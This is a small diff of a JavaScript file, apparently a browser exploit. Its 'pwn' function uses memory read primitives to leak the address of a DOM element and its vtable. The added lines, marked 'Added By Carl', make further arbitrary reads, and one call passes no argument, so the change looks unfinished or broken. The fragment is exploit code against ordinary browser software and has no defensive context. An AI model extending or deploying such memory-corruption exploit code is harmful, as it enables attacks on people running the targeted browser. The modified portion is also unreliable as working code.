@@ -720,7 +720,14 @@ var pwn = function(){
     var wrapper = document.createElement('div');
     var el = rw.read64AtObj(wrapper, FPO);
     print("element is at 0x" + bh.f64ToStr(el));
-
+    //Added By Carl
+    
+    var write = rw.read64();
+    
+    var writer = rw.read64AtObj(wrapper, write);
+    print("" + bh.f64ToStr(write));
+    
+    //End of Added By Carl
     var vtable = rw.read64(el);
     print("element vtable is at 0x" + bh.f64ToStr(vtable));
 
